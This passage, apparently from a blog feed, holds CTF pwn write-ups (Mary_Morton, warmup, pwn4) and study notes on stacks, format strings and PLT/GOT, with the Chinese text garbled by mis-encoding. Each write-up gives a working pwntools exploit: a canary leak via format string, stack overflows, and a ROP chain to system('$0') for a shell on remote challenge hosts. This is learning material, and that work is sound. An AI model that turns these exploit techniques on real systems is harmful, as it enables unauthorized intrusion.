class="line">p.sendline(<span class="string">'Bxnop'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200610172459341.png" alt="image-20200610172459341"></p></li><li><p><strong>æ€»ç»“ï¼š1.è¿˜æ˜¯æ ˆæº¢å‡ºï¼Œä½†ä¸æ˜¯é€šè¿‡æ”¹å˜å‡½æ•°çš„è¿”å›åœ°å€ï¼Œè§è¯†æ›´å¤šäº†å§ã€‚2.\x09ä¸\xaæ˜¯åå­—ç¬¦ï¼Œå½“è¯»åˆ°è¿™2ä¸ªå­—ç¬¦çš„æ—¶å€™ä¼šæˆªæ–­ã€‚</strong></p></li></ul><hr><h2 id="Mary-Morton"><a href="#Mary-Morton" class="headerlink" title="Mary_Morton"></a>Mary_Morton</h2><blockquote><p>é€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ‰¾åˆ°canaryåæ ˆæº¢å‡ºæ§åˆ¶ç¨‹åºèµ°å‘ã€‚ä½†æ˜¯ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚å› ä¸ºå¼€å§‹ä½¿ç”¨çš„recvuntil(â€˜â€™)æ²¡æœ‰æ³¨æ„<strong>â€˜\nâ€™</strong>å¯¼è‡´åé¢ç›´æ¥ä½¿ç”¨recv()å¼€å§‹åªèƒ½æ¥æ”¶åˆ°<strong>â€™\nâ€™</strong>ï¼ŒèŠ±äº†å¥½å¤šæ—¶é—´å¡åœ¨è¿™é‡Œã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ç®—æ•™è®­äº†ã€‚</p></blockquote><ul><li><p>é™¤äº†PIEå…¶ä»–ä¿æŠ¤å…¨å¼€ã€‚è¿è¡Œçœ‹ä¸€ä¸‹ï¼Œè®©é€‰æ‹©æ˜¯æ ˆæº¢å‡ºè¿˜æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚ idaä¸­çœ‹çœ‹ã€‚</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200611162320998.png" alt="image-20200611162320998"></p></li><li><p>è™½ç„¶æ˜¯ç¬¬ä¸€æ¬¡é‡åˆ°ï¼Œä½†ä¹Ÿæ˜¯å¾ˆå®¹æ˜“æƒ³åˆ°ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ˜¯è®©æˆ‘ä»¬æ³„éœ²canaryç”¨çš„ï¼ŒçŸ¥é“çš„canaryå°±å¯ä»¥å¿«ä¹çš„æ ˆæº¢å‡ºäº†ã€‚</p></li><li><p>é‚£å‰©ä¸‹çš„å°±éƒ½æ˜¯å¸¸è§„æ“ä½œäº†ï¼Œè„šæœ¬æ”»å‡»ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">53667</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'3. Exit the battle '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.sendline(<span class="string">'%23$p'</span>)</span><br><span class="line">canary = int(p.recv(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x88</span>*<span class="string">'a'</span> + p64(canary) + <span class="number">8</span>*<span class="string">'a'</span> + p64(<span class="number">0x00000000004008DA</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'3. Exit the battle '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li><li><p>é—®é¢˜æ¥äº†ã€‚ã€‚ã€‚æ— è®ºæ€ä¹ˆæ”¹<strong>canary = int(p.recv(), 16)</strong>æ¥å—å±å¹•æ‰“å°å‡ºçš„å­—ç¬¦è¿™å¥è¯éƒ½æŠ¥é”™ã€‚ã€‚ã€‚2ä¸ªå¤šå°æ—¶è€—åœ¨è¿™é‡Œã€‚ã€‚ã€‚åé¢å°±è¯•äº†è¯•å…ˆ<strong>p.recvuntil(â€˜0xâ€™)</strong>ï¼ŒæˆåŠŸäº†ã€‚ã€‚ã€‚ä½†è‡ªå·±è¿˜æ˜¯å¾ˆéƒé—·ã€‚ã€‚ã€‚åˆç»§ç»­æ‰¾åŸå› ï¼Œæœ€åæ‰å‘ç°<strong>p.recvuntil(â€˜3. Exit the battle â€˜)</strong>ä¸­å°‘äº† <strong>\n</strong>ï¼Œå¯¼è‡´åé¢ç›´æ¥recv()æ¥å—åˆ°çš„éƒ½æ˜¯å›è½¦ï¼Œè¿˜æ˜¯recvuntil()ä¿éšœã€‚ã€‚ã€‚</p></li><li><p>åŠ ä¸Šåå†æ”»å‡»ï¼ŒæˆåŠŸã€‚ã€‚ã€‚</p><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200611163417332.png" alt="image-20200611163417332"></p></li><li><p>æ€»ç»“ï¼š1.è¿˜æ˜¯å¤šç”¨recvuntilå§ï¼Œä¿éšœäº›ã€‚2.æ³¨æ„ä½¿ç”¨recvuntilæ—¶ä¸­çš„å­—ç¬¦ä¸²æ˜¯å¦åŒ…å«åˆ°æœ€åã€‚3.RELROä¸ºâ€ Partial RELROâ€ï¼Œè¯´æ˜æˆ‘ä»¬å¯¹GOTè¡¨å…·æœ‰å†™æƒé™ã€‚</p></li></ul><hr><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><blockquote><p>ADworldæ²¡æœ‰ç»™é¢˜ç›®é™„ä»¶ï¼Œæœ€åçœ‹äº†çœ‹åˆ«äººå‘çš„idaä¼ªä»£ç ï¼Œå°±åªæ˜¯ç®€å•çš„æ ˆæº¢å‡ºæ§åˆ¶ç¨‹åºèµ°å‘ã€‚</p></blockquote><ul><li><p>é¢˜ç›®å¼€å¤´å°±ç»™äº†ä¸€ä¸ªåœ°å€ï¼Œåé¢åˆæ˜¯æ˜æ˜¾çš„æ ˆæº¢å‡ºï¼ŒçŒœä¹Ÿå¯çŒœåˆ°æ˜¯å°†å‡½æ•°è¿”å›åœ°å€è¦†ç›–ä¸ºç»™å‡ºçš„åœ°å€ã€‚</p></li><li><p>è„šæœ¬æ”»å‡»ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'220.249.52.133'</span>, <span class="number">37196</span>)</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x40</span>+<span class="number">8</span>)*<span class="string">'a'</span> + p64(<span class="number">0x40060d</span>)</span><br><span class="line">p.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200612101533939.png" alt="image-20200612101533939"></p></li><li><p>æ€»ç»“ï¼šæ— ã€‚</p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;guess-num&quot;&gt;&lt;a href=&quot;#guess-num&quot; class=&quot;headerlink&quot; title=&quot;guess_num&quot;&gt;&lt;/a&gt;guess_num&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;æ ˆæº¢å‡º&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;idaæ‰“å¼€çœ‹ä¸€ä¸‹ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/06/04/pwn%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%881%EF%BC%89/image-20200604180206603.png&quot; alt=&quot;image-20200604180206603&quot;&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Pwn" scheme="https://www.Bxnop.cn/categories/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>pwn è®ºå‰‘åœº</title>
    <link href="https://www.bxnop.cn/2020/06/03/pwn%20%E8%AE%BA%E5%89%91%E5%9C%BA/"/>
    <id>https://www.bxnop.cn/2020/06/03/pwn%20%E8%AE%BA%E5%89%91%E5%9C%BA/</id>
    <published>2020-06-03T11:59:11.000Z</published>
    <updated>2020-06-12T08:45:46.528Z</updated>
    
    <content type="html"><![CDATA[<h2 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h2><blockquote><p>åˆ©ç”¨æ ˆæº¢å‡ºæ§åˆ¶ç¨‹åºçš„èµ°å‘</p></blockquote><ul><li><p>é¦–å…ˆä½¿ç”¨fileä¸checksecæŸ¥çœ‹ä¸€ä¸‹ï¼Œ64ä¸ºelfæ–‡ä»¶ï¼Œä¸”æ²¡æœ‰å¼€ä»»ä½•ä¿æŠ¤ï¼Œé‚£æ²¡æœ‰canaryï¼Œå°±å¯ä»¥åˆ©ç”¨æ ˆæº¢å‡ºæ§åˆ¶ç¨‹åºèµ°å‘äº†ã€‚</p></li><li><p>idaä¸­çœ‹ä¸€ä¸‹ï¼Œæ˜æ˜¾å­˜åœ¨æº¢å‡ºã€‚</p><p><img src="/2020/06/03/pwn%20%E8%AE%BA%E5%89%91%E5%9C%BA/image-20200605092808030-1591322466624.png" alt="image-20200605092808030"></p></li></ul>  <a id="more"></a><ul><li><p>ç»§ç»­çœ‹ä¸€ä¸‹å­—ç¬¦ä¸²ï¼Œæ‰¾åˆ°å¼•ç”¨çš„åœ°æ–¹å‘ç°äº†systemå‘½ä»¤ï¼Œä½†ä¸æ˜¯æ‰“å¼€shellä¹‹ç±»çš„å­—ç¬¦ä¸²ã€‚</p><p><img src="/2020/06/03/pwn%20%E8%AE%BA%E5%89%91%E5%9C%BA/image-20200605093020161.png" alt="image-20200605093020161"></p></li><li><p>ç”±äºåˆšæ¥è§¦ï¼Œå¾ˆå¤šä¸œè¥¿éƒ½ä¸çŸ¥é“ï¼Œçœ‹äº†writeupï¼Œé•¿çŸ¥è¯†äº†ã€‚ç”±äºé¢˜ä¸­æœ‰ $0 å­—ç¬¦ï¼Œè€Œè¿™å°±æ˜¯ shellæœ¬èº«çš„åç§°ï¼Œå¯ä»¥ç”¨å®ƒå½“ä½œä¼ å…¥çš„systemï¼ˆï¼‰å‡½æ•°çš„å‚æ•°ä½¿ç”¨ã€‚</p></li></ul><blockquote><p>ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼š<code>system()</code>ä¼šè°ƒç”¨<code>fork()</code>äº§ç”Ÿå­è¿›ç¨‹ï¼Œç”±å­è¿›ç¨‹æ¥è°ƒç”¨<code>/bin/bash -c string</code>æ¥æ‰§è¡Œå‚æ•°<code>string</code>å­—ç¬¦ä¸²æ‰€ä»£è¡¨çš„å‘½ä»¤ï¼Œæ­¤å‘½ä»¤æ‰§è¡Œå®Œåéšå³è¿”å›åŸè°ƒç”¨çš„è¿›ç¨‹ã€‚</p></blockquote><blockquote><p>64ä½ç¨‹åºä¼ å‚çš„ç‰¹ç‚¹ï¼š<strong>ä½¿ç”¨å¯„å­˜å™¨ä¼ å‚</strong>ï¼Œåˆ†åˆ«ç”¨<code>rdi</code>ã€<code>rsi</code>ã€<code>rdx</code>ã€<code>rcx</code>ã€<code>r8</code>ã€<code>r9</code>æ¥ä¼ é€’å‚æ•°ï¼ˆå‚æ•°ä¸ªæ•°å°äº7çš„æ—¶å€™ï¼‰ã€‚</p></blockquote><ul><li><p>æ‰€ä»¥è¿™é‡Œè¦å…ˆè®©ç¨‹åºçš„èµ°å‘åˆ° <code>pop edi;ret</code>, è®©ç¬¬ä¸€ä¸ªä¼ å‚å¯„å­˜å™¨å¾—åˆ° $0çš„åœ°å€ï¼Œé‚£åé¢å†é€šè¿‡ret ä½¿systemï¼ˆï¼‰çš„åœ°å€å¼¹å‡ºç»™ eipï¼Œå¾—åˆ°shellã€‚</p></li><li><p>å¼€å§‹å·¥ä½œã€‚</p><p><img src="/2020/06/03/pwn%20%E8%AE%BA%E5%89%91%E5%9C%BA/image-20200605095114997.png" alt="image-20200605095114997"></p><p><img src="/2020/06/03/pwn%20%E8%AE%BA%E5%89%91%E5%9C%BA/image-20200605095231700.png" alt="image-20200605095231700"></p><p><img src="/2020/06/03/pwn%20%E8%AE%BA%E5%89%91%E5%9C%BA/image-20200605095322038.png" alt="image-20200605095322038"></p></li><li><p>å†™pyè„šæœ¬æ”»å‡»ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'114.116.54.89'</span>, <span class="number">10004</span>)</span><br><span class="line"></span><br><span class="line">edi = <span class="number">0x00000000004007d3</span></span><br><span class="line">bash = <span class="number">0x000000000060111f</span></span><br><span class="line">sys = <span class="number">0x000000000040075A</span></span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x10</span>+<span class="number">8</span>)*<span class="string">'a'</span> + p64(edi) + p64(bash) + p64(sys)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li><li><p>å¾—åˆ°shellã€‚</p><p><img src="/2020/06/03/pwn%20%E8%AE%BA%E5%89%91%E5%9C%BA/image-20200605095503617.png" alt="image-20200605095503617"></p></li><li><p><strong>æ€»ç»“ï¼š1.åœ¨æ²¡æœ‰â€˜bin\bashâ€™å­—ç¬¦ä¸²æ—¶çœ‹çœ‹â€™$0â€˜ã€‚2.64ä½ç¨‹åºçš„ä¼ å‚æ–¹å¼ï¼Œå¯„å­˜å™¨é¡ºåºã€‚3.ROPgadgetå·¥å…·çš„ä½¿ç”¨ã€‚</strong></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;pwn4&quot;&gt;&lt;a href=&quot;#pwn4&quot; class=&quot;headerlink&quot; title=&quot;pwn4&quot;&gt;&lt;/a&gt;pwn4&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;åˆ©ç”¨æ ˆæº¢å‡ºæ§åˆ¶ç¨‹åºçš„èµ°å‘&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;é¦–å…ˆä½¿ç”¨fileä¸checksecæŸ¥çœ‹ä¸€ä¸‹ï¼Œ64ä¸ºelfæ–‡ä»¶ï¼Œä¸”æ²¡æœ‰å¼€ä»»ä½•ä¿æŠ¤ï¼Œé‚£æ²¡æœ‰canaryï¼Œå°±å¯ä»¥åˆ©ç”¨æ ˆæº¢å‡ºæ§åˆ¶ç¨‹åºèµ°å‘äº†ã€‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;idaä¸­çœ‹ä¸€ä¸‹ï¼Œæ˜æ˜¾å­˜åœ¨æº¢å‡ºã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2020/06/03/pwn%20%E8%AE%BA%E5%89%91%E5%9C%BA/image-20200605092808030-1591322466624.png&quot; alt=&quot;image-20200605092808030&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Pwn" scheme="https://www.Bxnop.cn/categories/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>pwnç¬”è®°</title>
    <link href="https://www.bxnop.cn/2020/06/03/pwn%E7%AC%94%E8%AE%B0/"/>
    <id>https://www.bxnop.cn/2020/06/03/pwn%E7%AC%94%E8%AE%B0/</id>
    <published>2020-06-03T05:10:04.000Z</published>
    <updated>2020-06-09T03:42:50.871Z</updated>
    
    <content type="html"><![CDATA[<h2 id="æ ˆçš„å­¦ä¹ ç†è§£"><a href="#æ ˆçš„å­¦ä¹ ç†è§£" class="headerlink" title="æ ˆçš„å­¦ä¹ ç†è§£"></a>æ ˆçš„å­¦ä¹ ç†è§£</h2><p>1.å¯¹äºæ ˆï¼Œä¸»è¦æ˜¯ç¨‹åºè¿è¡Œä¸­ä¿å­˜å‡½æ•°çš„è¿è¡ŒçŠ¶æ€ä¿¡æ¯ï¼Œå‚æ•°åŠå±€éƒ¨å˜é‡ã€‚å‘ç”Ÿå‡½æ•°è°ƒç”¨æ—¶ï¼Œè°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰çš„çŠ¶æ€è¢«ä¿å­˜åœ¨æ ˆå†…ï¼Œè¢«è°ƒç”¨å‡½æ•°ï¼ˆcalleeï¼‰çš„çŠ¶æ€è¢«å‹å…¥è°ƒç”¨æ ˆçš„æ ˆé¡¶ï¼›å‡½æ•°è°ƒç”¨ç»“æŸåé€šè¿‡ä¸€äº›åˆ—æŒ‡ä»¤è¿˜åŸè°ƒç”¨å‡½æ•°çš„çŠ¶æ€ä¿¡æ¯ï¼Œå¹¶æ‰§è¡Œè°ƒç”¨å‡½æ•°ä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚</p><blockquote><p>å…¥æ ˆé¡ºåºï¼š1.å‚æ•° 2.è°ƒç”¨å‡½æ•°çš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ï¼ˆé€šè¿‡ callï¼‰3.è°ƒç”¨å‡½æ•°æ ˆçš„åŸºåœ°å€ï¼ˆebpï¼‰4.è¢«è°ƒç”¨å‡½æ•°éœ€è¦ä½¿ç”¨çš„å±€éƒ¨å˜é‡ã€‚<a id="more"></a></p></blockquote><p>2.ä¸€å¼ å›¾å¯ä»¥å¾ˆæ¸…æ¥šçš„è¡¨ç¤ºå‡ºæ¥ã€‚</p><p><img src="/2020/06/03/pwn%E7%AC%94%E8%AE%B0/image-20200609114209670.png" alt="image-20200609114209670"></p><p>3.åœ¨idaä¸­çœ‹è¿™ä¸ªä¹Ÿå¾ˆæ˜¯æ–¹ä¾¿ã€‚</p><p><img src="/2020/06/03/pwn%E7%AC%94%E8%AE%B0/image-20200603141926461.png" alt="image-20200603141926461"></p><blockquote><p>å‡½æ•°è°ƒç”¨ç»“æŸåï¼š1.å…ˆå¼¹å‡ºå±€éƒ¨å˜é‡ï¼ˆmov esp, ebpï¼‰2.æ¥ç€è¿”å›è°ƒç”¨å‡½æ•°çš„åŸºåœ°å€ï¼ˆpop ebpï¼‰3.æœ€åå¼¹å‡ºè¢«è°ƒç”¨å‡½æ•°çš„è¿”å›åœ°å€ï¼ˆpop eipï¼‰ã€‚æ­¤æ—¶å‡½æ•°å°±æ¥ç€æ‰§è¡Œè¢«è°ƒç”¨å‡½æ•°åé¢ä¸€æ¡æŒ‡ä»¤ï¼Œå†é‡åˆ°å‡½æ•°è°ƒç”¨ä¹Ÿæ˜¯åŒæ ·çš„æ ˆæ“ä½œã€‚</p><p>åœ¨çœ‹æ±‡ç¼–ä¸­å¯ä»¥å‘ç°ï¼Œç¨‹åºåœ¨æ¯æ¬¡å¼¹å‡ºå±€éƒ¨å˜é‡ä¸ebpéƒ½æ˜¯ä½¿ç”¨ä¸€æ¡æŒ‡ä»¤leaveï¼Œä¹Ÿå°±æ˜¯ mov esp, ebp; pop ebp çš„åŠŸèƒ½ã€‚</p></blockquote><h2 id="å‡½æ•°ä¼ å‚ä»å·¦åˆ°å³"><a href="#å‡½æ•°ä¼ å‚ä»å·¦åˆ°å³" class="headerlink" title="å‡½æ•°ä¼ å‚ä»å·¦åˆ°å³"></a>å‡½æ•°ä¼ å‚ä»å·¦åˆ°å³</h2><p>1.å‡½æ•°ä¼ å‚éƒ½æ˜¯ä»å³å‘å·¦çš„ã€‚å¦‚æœæ˜¯ä»å·¦å‘å³ä¼šæ€ä¹ˆæ ·å‘¢ï¼Ÿ</p><p>2.æ‹¿ç»å…¸çš„printf(const char *format, argv..)æ¥å‡è®¾ã€‚formatæœ€å…ˆè¿›æ ˆï¼Œä¹‹åæ˜¯å„ä¸ªå‚æ•°è¿›æ ˆï¼Œç„¶åæ˜¯è¢«è°ƒå‡½æ•°çš„è¿”å›åœ°å€ï¼Œè°ƒç”¨å‡½æ•°åŸºåœ°å€ã€‚è¿™ä¸ªæ—¶å€™è¢«è°ƒå‡½æ•°é¦–å…ˆè‚¯å®šæ˜¯è¦æ‰¾åˆ°formatï¼Œä½†æ˜¯åœ¨å®ƒä¸Šé¢è¿˜æœ‰æœªçŸ¥ä¸ªæ•°çš„å‚æ•°ï¼Œæƒ³è¦çŸ¥é“å‚æ•°ä¸ªæ•°åˆå¿…é¡»æ‰¾åˆ°formatï¼Œè¦æ‰¾åˆ°formatåˆå¿…é¡»çŸ¥é“å‚æ•°ä¸ªæ•°ã€‚è¿™æ ·ä»¥æ¥å°±é™·å…¥è¿™æ ·çš„æ­»å¾ªç¯ã€‚</p><p>3.å½“ç„¶ä»å³å¾€å·¦ä¼ å‚å°±ä¸ä¸€æ ·äº†ï¼Œç›´æ¥åŠ å›ºå®šçš„espå°±å¯ä»¥å…ˆæ‰¾åˆ°formatï¼Œå†ä¾æ¬¡æ£€ç´¢å‚æ•°å³å¯ã€‚</p><h2 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²</h2><p>1.è§¦å‘æ ¼å¼åŒ–å­—ç¬¦æ¼æ´çš„ä¸»è¦å‡½æ•°æœ‰ï¼šprintfï¼Œsprintfï¼Œfprintfã€‚</p><p>2.printfï¼ˆï¼‰å‡½æ•°åœ¨æ‰§è¡Œæ—¶å¹¶ä¸çŸ¥é“å‚æ•°ä¸ªæ•°ï¼Œå®ƒå†…éƒ¨æœ‰ä¸€ä¸€ä¸ªæŒ‡é’ˆï¼Œç”¨æ¥ç´¢æ£€æ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚å¯¹äºç‰¹å®šç±»å‹%ï¼Œå°±å»å–ç›¸åº”å‚æ•°çš„å€¼ï¼Œç›´åˆ°ç´¢æ£€åˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²ç»“æŸã€‚æ‰€ä»¥æ²¡æœ‰å‚æ•°ï¼Œä»£ç ä¹Ÿä¼šå°†format string åé¢çš„å†…å­˜å½“åšå‚æ•°ä»¥16è¿›åˆ¶è¾“å‡ºã€‚è¿™æ ·å°±ä¼šé€ æˆå†…å­˜æ³„éœ²ã€‚</p><p>3.å½“ç„¶ï¼Œè§„èŒƒçš„ä½¿ç”¨printf()ç­‰å‡½æ•°ï¼Œè¿˜æ˜¯ä¸ä¼šé—®é¢˜ã€‚ä¸»è¦å°±æ˜¯åƒ<code>gets(s);printf(s)</code>è¿™æ ·çš„ç”¨æ³•ï¼Œä½¿è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„è¾“å…¥æƒäº¤ç»™äº†æˆ‘ä»¬ã€‚</p><p>4.å…¶ä¸­ä¸€ä¸ªé‡è¦çš„æ ¼å¼åŒ–è¯´æ˜ç¬¦ï¼Œä¹Ÿæ˜¯è¿™ä¸ªæ¼æ´åˆ©ç”¨çš„å…³é”®ã€‚<strong>%xn</strong>ï¼Œå°†æˆ‘ä»¬å‰é¢å·²ç»è¾“å…¥çš„å­—ç¬¦ä¸ªæ•°å€¼å†™å…¥åé¢çš„ç¬¬xä¸ªå‚æ•°çš„åœ°å€å†…ã€‚</p><p>5.ä¸€ä¸ªä¾‹å­å¯ä»¥å¾ˆå¥½çš„è¯´æ˜ã€‚</p><p><img src="/2020/06/03/pwn%E7%AC%94%E8%AE%B0/image-20200605190434500.png" alt="image-20200605190434500"></p><h2 id="pltä¸got"><a href="#pltä¸got" class="headerlink" title="pltä¸got"></a>pltä¸got</h2><p>1.ä»–ä»¬å­˜åœ¨å®è´¨å°±æ˜¯ä¸ºäº†å¯¹ç¨‹åºæ‰€è¦ä½¿ç”¨çš„å…¬å…±å‡½æ•°ï¼ˆåœ¨åŠ¨æ€é“¾æ¥åº“é‡Œï¼‰è¿›è¡Œä¸€ä¸ªé‡å®šä½ï¼Œè¿™å°±å¥½æ¯”PEä¸­çš„è¾“å…¥è¡¨çš„ä¸­çš„åœ°å€ä¿®æ­£ã€‚</p><p>2.å¯¹äºelfæ–‡ä»¶ï¼Œå®ƒåœ¨æ‰§è¡Œä¸€ä¸ªåŠ¨æ€åº“å‡½æ•°å¦‚printfå‡½æ•°æ—¶ï¼Œå…ˆcall printf@pltï¼ˆprintf@pltå…¶å®æ˜¯ä¸€å°æ®µä»£ç çš„é¦–åœ°å€ï¼‰ï¼Œç„¶ååœ¨printf@pltè¿™æ®µä»£ç ä¸­å†åˆ°.got.pltä¸­æ‰¾å‡½æ•°å®é™…çš„åœ°å€æœ€åè·³è½¬ã€‚</p><p>3.é‚£å…¶å® .pltå…¶å®å°±æ˜¯å­˜æ”¾ç€æ‰€è¦ä½¿ç”¨å‡½æ•°çš„ä¿¡æ¯åŠè·³è½¬ï¼Œè€Œæ‰€æœ‰è¦ä½¿ç”¨çš„å‡½æ•°ä¿¡æ¯å°±ç»„æˆäº† .pltè¡¨ã€‚</p><p>4.å¯¹äº.gotè¡¨å°±æ˜¯å­˜åœ¨æ¯ä¸ªæ‰€éœ€è¦çš„å‡½æ•°çš„å®é™…åœ°å€ï¼Œ.got.pltå…¶å®æ˜¯.gotè¡¨çš„ä¸€éƒ¨åˆ†ã€‚</p><p><strong>5.æ‰€ä»¥åœ¨pwné¢˜ä¸­ï¼Œæ‰¾åŠ¨æ€åº“å‡½æ•°çš„å®é™…åœ°å€æ—¶è¦ç”¨ elf.got[â€˜å‡½æ•°åç§°â€™]ï¼›æ‰§è¡Œå‡½æ•°çš„åœ°å€ç”¨ elf.plt[â€˜å‡½æ•°åœ°å€â€™]ã€‚</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;æ ˆçš„å­¦ä¹ ç†è§£&quot;&gt;&lt;a href=&quot;#æ ˆçš„å­¦ä¹ ç†è§£&quot; class=&quot;headerlink&quot; title=&quot;æ ˆçš„å­¦ä¹ ç†è§£&quot;&gt;&lt;/a&gt;æ ˆçš„å­¦ä¹ ç†è§£&lt;/h2&gt;&lt;p&gt;1.å¯¹äºæ ˆï¼Œä¸»è¦æ˜¯ç¨‹åºè¿è¡Œä¸­ä¿å­˜å‡½æ•°çš„è¿è¡ŒçŠ¶æ€ä¿¡æ¯ï¼Œå‚æ•°åŠå±€éƒ¨å˜é‡ã€‚å‘ç”Ÿå‡½æ•°è°ƒç”¨æ—¶ï¼Œè°ƒç”¨å‡½æ•°ï¼ˆcallerï¼‰çš„çŠ¶æ€è¢«ä¿å­˜åœ¨æ ˆå†…ï¼Œè¢«è°ƒç”¨å‡½æ•°ï¼ˆcalleeï¼‰çš„çŠ¶æ€è¢«å‹å…¥è°ƒç”¨æ ˆçš„æ ˆé¡¶ï¼›å‡½æ•°è°ƒç”¨ç»“æŸåé€šè¿‡ä¸€äº›åˆ—æŒ‡ä»¤è¿˜åŸè°ƒç”¨å‡½æ•°çš„çŠ¶æ€ä¿¡æ¯ï¼Œå¹¶æ‰§è¡Œè°ƒç”¨å‡½æ•°ä¸‹ä¸€æ¡æŒ‡ä»¤ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;å…¥æ ˆé¡ºåºï¼š1.å‚æ•° 2.è°ƒç”¨å‡½æ•°çš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ï¼ˆé€šè¿‡ callï¼‰3.è°ƒç”¨å‡½æ•°æ ˆçš„åŸºåœ°å€ï¼ˆebpï¼‰4.è¢«è°ƒç”¨å‡½æ•°éœ€è¦ä½¿ç”¨çš„å±€éƒ¨å˜é‡ã€‚&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="Pwn" scheme="https://www.Bxnop.cn/categories/Pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>pwn pwnableï¼ˆ1ï¼‰</title>
    <link href="https://www.bxnop.cn/2020/06/03/pwn%20pwnable%EF%BC%881%EF%BC%89/"/>
    <id>https://www.bxnop.cn/2020/06/03/pwn%20pwnable%EF%BC%881%EF%BC%89/</id>
    <published>2020-06-03T05:09:46.000Z</published>
    <updated>2020-06-08T14:23:56.714Z</updated>
    
